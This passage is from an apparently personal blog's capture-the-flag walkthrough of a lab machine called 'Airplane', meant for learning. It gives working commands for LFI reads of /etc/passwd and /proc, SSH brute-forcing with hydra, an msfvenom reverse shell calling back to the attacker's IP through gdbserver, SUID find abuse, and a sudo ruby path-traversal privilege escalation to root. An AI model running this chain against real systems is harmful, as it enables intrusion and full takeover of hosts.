</span></span></code></pre></div><p>Checked vhosts but nothing interesting found.</p><h3 id=nessus>Nessus</h3><p><figure><img src=/posts/airplane/6.png title="Nessus Web App scan result" style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>Nessus Web App scan result</strong></figcaption></figure>Used <code>Nessus Web Application scaner</code> and found <code>LFI</code> vulnerability.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl http://airplane.thm:8000/?page<span class=o>=</span>../../../../../../../../etc/passwd &gt; passwd
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ grep /bin/bash passwd                
</span></span><span class=line><span class=cl>root:x:0:0:root:/root:/bin/bash
</span></span><span class=line><span class=cl>carlos:x:1000:1000:carlos,,,:/home/carlos:/bin/bash
</span></span><span class=line><span class=cl>hudson:x:1001:1001::/home/hudson:/bin/bash 
</span></span></code></pre></div><p>Found 3 usernames: <strong>root, carlos, hudson</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>export</span> <span class=nv>filename</span><span class=o>=</span>users.txt
</span></span><span class=line><span class=cl><span class=nb>echo</span> root &gt; <span class=nv>$filename</span> <span class=o>&amp;&amp;</span> <span class=nb>echo</span> carlos &gt;&gt; <span class=nv>$filename</span> <span class=o>&amp;&amp;</span> <span class=nb>echo</span> hudson &gt;&gt; <span class=nv>$filename</span>
</span></span></code></pre></div><p>Lets start brutforcing ssh with the usernames.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>hydra -L users.txt -P /usr/share/wordlists/rockyou.txt airplane.thm ssh
</span></span></code></pre></div><p>No useful results found.<br>Lets use <code>LFI</code> to gather more information.</p><h3 id=proc>/proc/</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ curl http://airplane.thm:8000/?page<span class=o>=</span>../../../../../../../../proc/self/environ --output -
</span></span><span class=line><span class=cl><span class=nv>LANG</span><span class=o>=</span>en_US.UTF-8LC_ADDRESS<span class=o>=</span>tr_TR.UTF-8LC_IDENTIFICATION<span class=o>=</span>tr_TR.UTF-8LC_MEASUREMENT<span class=o>=</span>tr_TR.UTF-8LC_MONETARY<span class=o>=</span>tr_TR.UTF-8LC_NAME<span class=o>=</span>tr_TR.UTF-8LC_NUMERIC<span class=o>=</span>tr_TR.UTF-8LC_PAPER<span class=o>=</span>tr_TR.UTF-8LC_TELEPHONE<span class=o>=</span>tr_TR.UTF-8LC_TIME<span class=o>=</span>tr_TR.UTF-8PATH<span class=o>=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/binHOME<span class=o>=</span>/home/hudsonLOGNAME<span class=o>=</span><span class=nv>hudsonUSER</span><span class=o>=</span><span class=nv>hudsonSHELL</span><span class=o>=</span>/bin/bashINVOCATION_ID<span class=o>=</span><span class=nv>b6661084f65743da8c323f7d0963e579JOURNAL_STREAM</span><span class=o>=</span>9:20506
</span></span></code></pre></div><p>From <code>USER=hudson</code> in the above result, we confirmed that <code>LFI</code> is possible as user <code>hudson</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ curl http://airplane.thm:8000/?page<span class=o>=</span>../../../../../../../../proc/self/cmdline --output -
</span></span><span class=line><span class=cl>/usr/bin/python3app.py
</span></span><span class=line><span class=cl><span class=c1># The /proc/self/cmdline file in the Linux /proc filesystem contains the command-line arguments that were used to start the currently executing process.</span>
</span></span></code></pre></div><p>The current process is executed by running <code>/usr/bin/python3 app.py</code> in the target system by victim user.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ curl http://airplane.thm:8000/?page<span class=o>=</span>../../../../../../../../proc/sched_debug --output - <span class=p>|</span> grep airplane
</span></span><span class=line><span class=cl>runnable tasks:
</span></span><span class=line><span class=cl>S    task       PID    tree-key    switches  prio  wait-time   sum-exec   sum-sleep
</span></span><span class=line><span class=cl>-----------------------------------------------------------------------------------------------------------
</span></span><span class=line><span class=cl>t    airplane   <span class=m>580</span>    14.246406     <span class=m>5</span>       <span class=m>120</span>   0.000000    1.842503   0.000000 <span class=m>0</span> <span class=m>0</span> /autogroup-73
</span></span><span class=line><span class=cl><span class=c1># using /proc/sched_debug to check for interesting running processes.</span>
</span></span></code></pre></div><p>While checking the processes running in the system, found a process called <code>airplane</code> with <code>PID:580</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ curl http://airplane.thm:8000/?page<span class=o>=</span>../../../../../../../../proc/580/cmdline --output -
</span></span><span class=line><span class=cl>/opt/airplane
</span></span></code></pre></div><p>Process <code>airplane</code> is started from <code>/opt/airplane</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ curl http://airplane.thm:8000/?page<span class=o>=</span>../../../../../../../../proc/580/stat --output -
</span></span><span class=line><span class=cl><span class=m>580</span> <span class=o>(</span>airplane<span class=o>)</span> t <span class=m>531</span> <span class=m>580</span> <span class=m>531</span> <span class=m>0</span> -1 <span class=m>1073741824</span> <span class=m>132</span> <span class=m>0</span> <span class=m>0</span> <span class=m>0</span> <span class=m>0</span> <span class=m>0</span> <span class=m>0</span> <span class=m>0</span> <span class=m>20</span> <span class=m>0</span> <span class=m>1</span> <span class=m>0</span> <span class=m>1618</span> <span class=m>364544</span> <span class=m>1</span> <span class=m>18446744073709551615</span> <span class=m>93824992231424</span> <span class=m>93824992236021</span> <span class=m>140737488350208</span> <span class=m>0</span> <span class=m>0</span> <span class=m>0</span> <span class=m>0</span> <span class=m>4096</span> <span class=m>0</span> <span class=m>1</span> <span class=m>0</span> <span class=m>0</span> <span class=m>17</span> <span class=m>1</span> <span class=m>0</span> <span class=m>0</span> <span class=m>6</span> <span class=m>0</span> <span class=m>0</span> <span class=m>93824992247224</span> <span class=m>93824992247824</span> <span class=m>93824992251904</span> <span class=m>140737488350742</span> <span class=m>140737488350756</span> <span class=m>140737488350756</span> <span class=m>140737488351210</span> <span class=m>0</span>
</span></span></code></pre></div><p>Checking the status of <code>PID 580 (airplane)</code> we got the parent process <code>PID 531</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ curl http://airplane.thm:8000/?page<span class=o>=</span>../../../../../../../../proc/531/cmdline --output -
</span></span><span class=line><span class=cl>/usr/bin/gdbserver0.0.0.0:6048airplane
</span></span></code></pre></div><p>While checking the status of PID 531, we got that <code>/usr/bin/gdbserver</code> is being run in <code>port 6048</code>.</p><h2 id=exploitation>Exploitation</h2><figure><img src=/posts/airplane/9.png title="Hacktricks: GdbServer" style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>Hacktricks: GdbServer</strong></figcaption></figure><p>From <a href=https://book.hacktricks.xyz/network-services-pentesting/pentesting-remote-gdbserver#basic-information target=_blank rel=noopener>Hacktricks: GdbServer</a>
we got some info about gdbserver, and exploitation techniques. Lets follow that.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc -nvlp <span class=m>4444</span>
</span></span></code></pre></div><p>Start a netcat listener at port 4444.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Update your local ip in the place of 10.10.10.1</span>
</span></span><span class=line><span class=cl>msfvenom -p linux/x64/shell_reverse_tcp <span class=nv>LHOST</span><span class=o>=</span>10.10.10.1 <span class=nv>LPORT</span><span class=o>=</span><span class=m>4444</span> <span class=nv>PrependFork</span><span class=o>=</span><span class=nb>true</span> -f elf -o binary.elf
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>chmod +x binary.elf
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># install gdb if not exist using &#34;sudo apt install gdb&#34;</span>
</span></span><span class=line><span class=cl>gdb binary.elf
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Set remote debuger target</span>
</span></span><span class=line><span class=cl>target extended-remote airplane.thm:6048
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Upload elf file</span>
</span></span><span class=line><span class=cl>remote put binary.elf /tmp/binary.elf
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Set remote executable file</span>
</span></span><span class=line><span class=cl><span class=nb>set</span> remote exec-file /tmp/binary.elf
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Execute reverse shell executable</span>
</span></span><span class=line><span class=cl>run
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># You should get your reverse-shell</span>
</span></span></code></pre></div><p>This is the exploit command modified from <a href=https://book.hacktricks.xyz/network-services-pentesting/pentesting-remote-gdbserver#exploitation target=_blank rel=noopener>Hacktricks:Gdbserver-exploit</a>
. By running the above commands, got reverse shell as user <code>hudson</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 -c <span class=s1>&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class=line><span class=cl>^Z <span class=c1>#(Ctrl+Z)</span>
</span></span><span class=line><span class=cl>stty raw -echo <span class=o>&amp;&amp;</span> <span class=nb>fg</span>
</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>TERM</span><span class=o>=</span>xterm
</span></span></code></pre></div><p>Got stable shell by running above commands.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ find / -type f -perm -04000 -ls 2&gt;/dev/null
</span></span><span class=line><span class=cl><span class=m>262477</span>    <span class=m>316</span> -rwsr-xr-x   <span class=m>1</span> carlos   carlos     <span class=m>320160</span> Feb <span class=m>18</span>  <span class=m>2020</span> /usr/bin/find
</span></span></code></pre></div><p>While checking for <code>SUID binary</code> found a useful hit, we can run <code>/usr/bin/find</code> as user <code>carlos</code>. Lets use <a href=https://gtfobins.github.io/gtfobins/find/#suid target=_blank rel=noopener>GTFOBins:find</a>
to get the privilege of user carlos.</p><h3 id=lateral-movement>Lateral Movement</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ /usr/bin/find . -exec /bin/sh -p <span class=se>\;</span> -quit <span class=c1># exploiting the SUID binary find</span>
</span></span><span class=line><span class=cl>$ id 
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>1001<span class=o>(</span>hudson<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1001<span class=o>(</span>hudson<span class=o>)</span> <span class=nv>euid</span><span class=o>=</span>1000<span class=o>(</span>carlos<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>1001<span class=o>(</span>hudson<span class=o>)</span>
</span></span></code></pre></div><p>Now we can run commands as user carlos. We dont have interactive shell now, lets use ssh for getting better shell.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ssh-keygen -t rsa -f id_rsa -b <span class=m>4096</span> -C <span class=s1>&#39;&#39;</span> -N <span class=s1>&#39;&#39;</span>
</span></span></code></pre></div><p>Run the above command to generate a SSH key pair in local machine.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>echo</span> <span class=s1>&#39;contents_of_id_rsa.pub&#39;</span> &gt; /home/carlos/.ssh/authorized_keys
</span></span></code></pre></div><p>Run the above command in remote machine. This will make the key trusted for ssh connection.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ssh carlos@airplane.thm -i id_rsa
</span></span></code></pre></div><p>Running the above command we got ssh connection as user <code>carlos</code> with better shell.</p><h2 id=privilege-escalation>Privilege Escalation</h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>carlos@airplane:~$ id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>1000<span class=o>(</span>carlos<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1000<span class=o>(</span>carlos<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>1000<span class=o>(</span>carlos<span class=o>)</span>,27<span class=o>(</span>sudo<span class=o>)</span>
</span></span><span class=line><span class=cl>carlos@airplane:~$ sudo -l
</span></span><span class=line><span class=cl>Matching Defaults entries <span class=k>for</span> carlos on airplane:
</span></span><span class=line><span class=cl>    env_reset, mail_badpass, <span class=nv>secure_path</span><span class=o>=</span>/usr/local/sbin<span class=se>\:</span>/usr/local/bin<span class=se>\:</span>/usr/sbin<span class=se>\:</span>/usr/bin<span class=se>\:</span>/sbin<span class=se>\:</span>/bin<span class=se>\:</span>/snap/bin
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>User carlos may run the following commands on airplane:
</span></span><span class=line><span class=cl>    <span class=o>(</span>ALL<span class=o>)</span> NOPASSWD: /usr/bin/ruby /root/*.rb
</span></span></code></pre></div><p>From the above results we are able to run <code>/usr/bin/ruby /root/*.rb</code> as root using sudo command.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>echo</span> <span class=s1>&#39;exec &#34;/bin/sh&#34;&#39;</span> &gt; /tmp/exploit.rb
</span></span><span class=line><span class=cl>sudo /usr/bin/ruby /root/../tmp/exploit.rb
</span></span></code></pre></div><p>Created <code>exploit.rb</code> using hint from <a href=https://gtfobins.github.io/gtfobins/ruby/#sudo target=_blank rel=noopener>Hacktricks: ruby-sudo</a>
. Here <code>../</code> means previous directory by 1 step. <code>/root/../</code> is equal to <code>/</code> directory. Thus we can use the file <code>/tmp/exploit.rb</code> by the path <code>/root/../tmp/exploit.rb</code>. We got <code>root access</code> by running the above command.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>cat /home/carlos/user.txt /root/root.txt
</span></span></code></pre></div><p>We got user and root flags by running the above commands.</p><p>Happy Hacking !!! &#x1f60e;</p></article><script type=text/javascript>(function(){const i=document.querySelector(".darkmode-toggle input"),s="light",n="dark";let a=localStorage.theme===n||!("theme"in localStorage)&&window.matchMedia("(prefers-color-scheme: dark)").matches,t=a?n:s;const e=document.createElement("script");e.type="text/javascript";const r={repo:"cyberjagadeesh/cyberjagadeesh.github.io",repoId:"R_kgDOMfA4MA",category:"General",categoryId:"DIC_kwDOMfA4MM4ChYzn",mapping:"url",reactionsEnabled:"1",emitMetadata:"0",theme:t,lang:"en"};e.src="https://giscus.app/client.js",e.crossorigin="anonymous",e.async=!0,Object.entries(r).forEach(function(t){return e.dataset[t[0]]=t[1]});const o=document.currentScript;o.parentNode.insertBefore(e,o);function c(e){const t=document.querySelector("iframe.giscus-frame");if(!t)return;t.contentWindow.postMessage({giscus:e},"https://giscus.app")}i.addEventListener("change",function(){this.checked?t=n:t=s,c({setConfig:{theme:t}})})})()</script></div></div></div></main><footer class="flex flex-none justify-center"><section class="flex flex-col md:flex-row mx-2 md:mx-0 gap-2 md:gap-0 justify-between w-full max-w-4xl lg:max-w-5xl py-6 text-slate-500 dark:text-slate-300"><div class="flex flex-row"><a href=https://www.linkedin.com/in/jagadeeshwaran-m-562a011b3 target=_blank title=LinkedIn class="flex flex-row mr-2"><span class=hidden>LinkedIn</span>
<i class="h-6 w-6 flex-none"><svg class="icon icon-tabler icon-tabler-brand-linkedin" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 4m0 2a2 2 0 012-2h12a2 2 0 012 2v12a2 2 0 01-2 2H6a2 2 0 01-2-2z"/><path d="M8 11v5"/><path d="M8 8v.01"/><path d="M12 16v-5"/><path d="M16 16v-3a2 2 0 00-4 0"/></svg></i></a></div><div class=grow></div><div class="flex flex-row"><i class="h-6 w-6 flex-none"><svg class="icon icon-tabler icon-tabler-copyright" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 12m-9 0a9 9 0 1018 0A9 9 0 103 12"/><path d="M14 9.75a3.016 3.016.0 00-4.163.173 2.993 2.993.0 000 4.154A3.016 3.016.0 0014 14.25"/></svg>
</i>2024 CyberJagadeesh</div></section></footer><script src=/main.min.c6372b6836971865bd94bfde974748aca8415824a2facab6ccd66a87384bfacb.js></script><div class="hidden top-1 right-1" id=code-copy><i class="h-6 w-6 block"><svg class="icon icon-tabler icon-tabler-copy" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667A2.667 2.667.0 019.667 7h8.666A2.667 2.667.0 0121 9.667v8.666A2.667 2.667.0 0118.333 21H9.667A2.667 2.667.0 017 18.333z"/><path d="M4.012 16.737A2.005 2.005.0 013 15V5c0-1.1.9-2 2-2h10c.75.0 1.158.385 1.5 1"/></svg></i></div><div class="hidden top-1 right-1" id=code-copy-done><i class="h-6 w-6 block"><svg class="icon icon-tabler icon-tabler-check" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 12l5 5L20 7"/></svg></i></div><script src=/code-copy.min.e7b2a74adef1ed474c335c8bd5e7832b2316b8842b0f9184d65286c5bd64f51a.js></script></body></html>